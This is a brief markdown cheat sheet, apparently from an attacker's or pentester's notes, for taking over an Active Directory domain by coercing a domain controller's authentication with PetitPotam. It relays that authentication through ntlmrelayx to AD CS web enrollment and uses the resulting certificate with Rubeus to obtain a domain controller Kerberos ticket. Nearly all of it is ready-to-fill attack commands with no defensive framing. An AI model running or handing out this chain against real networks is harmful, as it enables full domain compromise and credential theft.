### Source
https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1  
https://github.com/topotam/PetitPotam  

### Find certificate autthority
```
certutil.exe
```

### Set up ntlm relay (forward incoming authentication from domain controller to certificate authority)
```
python3 ntlmrelayx.py -t http://&lt;certificateAuthority&gt;/certsrv/certfnsh.asp -smb2support --adcs
```

### Trigger authentication from domain controller
```
Invoke-Petitpotam -Target &lt;domainController&gt; -CaptureHost &lt;lhost&gt;
```

### Request kerberos TGT
```
Rubeus.exe asktgt /outfile:&lt;file&gt; /user:&lt;domainController&gt; /ptt /certificate:&lt;base64Certificate&gt;
```


